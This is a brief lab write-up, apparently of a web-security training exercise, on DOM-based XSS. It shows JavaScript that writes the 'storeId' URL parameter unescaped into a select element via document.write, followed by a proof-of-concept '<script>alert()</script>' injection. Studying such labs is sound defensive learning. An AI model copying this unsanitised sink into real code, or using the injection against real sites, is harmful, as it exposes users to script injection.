---
title: "10 - DOM XSS in document.write sink using source location.search inside a select element"
---

# 10 - DOM XSS in document.write sink using source location.search inside a select element

```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) { //Si hay una storeId custom como parámetro
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) { //Si hay una storeId predefinido
    if(stores[i] === store) {
        continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

```javascript
<option selected>'+store+'</option>
<option selected><script>alert()</script></option>
```
